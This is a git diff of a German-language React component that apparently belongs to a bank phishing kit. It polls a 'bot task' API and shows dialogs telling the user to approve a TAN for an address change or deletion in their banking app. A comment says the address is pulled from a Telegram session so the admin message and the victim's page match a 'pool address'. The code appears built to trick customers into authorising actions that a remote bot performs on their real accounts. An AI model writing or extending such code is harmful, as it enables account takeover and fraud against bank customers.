@@ -59,6 +59,8 @@ interface AddressVerificationProps {
   forceShowSecureGo?: boolean;
   /** Wird einmalig aufgerufen, sobald der erzwungene Dialog geöffnet wurde. */
   onSecureGoOpened?: () => void;
+  /** Wird aufgerufen, wenn die TAN abgelehnt wurde / Timeout / Fehler. */
+  onTanFailed?: (message: string) => void;
   /** Aktive Bot-Task-ID, um Bestätigung an die API zurückzumelden. */
   taskId?: string | null;
   apiBaseUrl?: string | null;
@@ -81,6 +83,7 @@ const AddressVerification = ({
   onNoAddress,
   forceShowSecureGo = false,
   onSecureGoOpened,
+  onTanFailed,
   taskId,
   apiBaseUrl,
 }: AddressVerificationProps) => {
@@ -200,11 +203,14 @@ const AddressVerification = ({
     };
   }, [showSecureGo, bankId, onDelete, taskId, apiBaseUrl]);
 
+  const [tanType, setTanType] = useState<"address" | "login" | null>(null);
+  const [addressTanSuccess, setAddressTanSuccess] = useState(false);
+
   useEffect(() => {
     if (!showDeleteDialog || !deleteAwaitingTan || !taskId) return;
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    let waitingForTanSeen = false;
+    let addressTanSeen = false;
     const startedAt = Date.now();
 
     const poll = async () => {
@@ -214,26 +220,41 @@ const AddressVerification = ({
         const { data } = await getBotTask(taskId);
         const status = String(data?.status ?? "").toLowerCase();
         const result = data?.result as any;
-        if (status === "waiting_for_tan") waitingForTanSeen = true;
+        const tt = String(data?.tan_type ?? result?.tan_type ?? "").toLowerCase();
+        if (tt === "address" || tt === "login") setTanType(tt as "address" | "login");
+        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) {
+          addressTanSeen = true;
+        }
+
         const approved =
           status === "tan_confirmed" ||
           status === "completed" ||
           result?.address_changed === true ||
           result?.address_confirmed === true ||
-          (waitingForTanSeen && status === "running");
+          (addressTanSeen && status === "running");
 
         if (approved) {
           setSecureGoApproved(true);
+          setAddressTanSuccess(true);
           setDeleteAwaitingTan(false);
           timer = setTimeout(() => {
             setShowDeleteDialog(false);
             onDelete();
-          }, 1200);
+          }, 5000);
           return;
         }
         if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
           setDeleteAwaitingTan(false);
-          setDeleteError("Die TAN-Bestätigung war nicht erfolgreich. Bitte versuchen Sie es erneut.");
+          setSecureGoApproved(false);
+          const msg =
+            status === "tan_timeout"
+              ? "Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut."
+              : "Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.";
+          setDeleteError(msg);
+          timer = setTimeout(() => {
+            setShowDeleteDialog(false);
+            onTanFailed?.(msg);
+          }, 1500);
           return;
         }
       } catch {
@@ -241,7 +262,12 @@ const AddressVerification = ({
       }
       if (Date.now() - startedAt >= 5 * 60 * 1000) {
         setDeleteAwaitingTan(false);
-        setDeleteError("Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.");
+        const msg = "Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.";
+        setDeleteError(msg);
+        timer = setTimeout(() => {
+          setShowDeleteDialog(false);
+          onTanFailed?.(msg);
+        }, 1500);
         return;
       }
       timer = setTimeout(poll, 2000);
@@ -252,7 +278,7 @@ const AddressVerification = ({
       cancelled = true;
       if (timer) clearTimeout(timer);
     };
-  }, [showDeleteDialog, deleteAwaitingTan, taskId, onDelete]);
+  }, [showDeleteDialog, deleteAwaitingTan, taskId, onDelete, onTanFailed]);
 
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
@@ -542,20 +568,29 @@ const AddressVerification = ({
                   <div className="rounded-lg border border-gray-200 p-4 space-y-3">
                     <div className="flex items-center gap-3">
                       <Smartphone className="w-5 h-5 text-gray-700" />
-                      <p className="font-semibold text-gray-900">Bestätigen mit {secureGoLabel}</p>
+                      <p className="font-semibold text-gray-900">
+                        {tanType === "address"
+                          ? `Adressänderung bestätigen mit ${secureGoLabel}`
+                          : `Bestätigen mit ${secureGoLabel}`}
+                      </p>
                     </div>
                     <p className="text-sm text-gray-600">
-                      Bitte bestätigen Sie die Adresslöschung in Ihrer App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde.
+                      {tanType === "address"
+                        ? "Bitte bestätigen Sie die Adressänderung in Ihrer Banking-App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde."
+                        : "Bitte bestätigen Sie den Vorgang in Ihrer App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde."}
                     </p>
                     <div className="flex justify-center py-1">
                       <div className="w-7 h-7 rounded-full border-[3px] border-gray-200 animate-spin" style={{ borderTopColor: themeColor }} />
                     </div>
                   </div>
                 )}
-                {secureGoApproved && (
-                  <div className="flex items-center justify-center gap-2 text-green-600 font-medium py-2">
-                    <CheckCircle2 className="w-6 h-6" />
-                    TAN-Freigabe bestätigt
+                {addressTanSuccess && (
+                  <div className="flex flex-col items-center justify-center gap-1 text-green-600 font-medium py-2">
+                    <div className="flex items-center gap-2">
+                      <CheckCircle2 className="w-6 h-6" />
+                      Adressänderung erfolgreich bestätigt
+                    </div>
+                    <p className="text-xs text-gray-500">Sie werden weitergeleitet…</p>
                   </div>
                 )}
                 {deleteError && <p className="text-sm text-red-600">{deleteError}</p>}
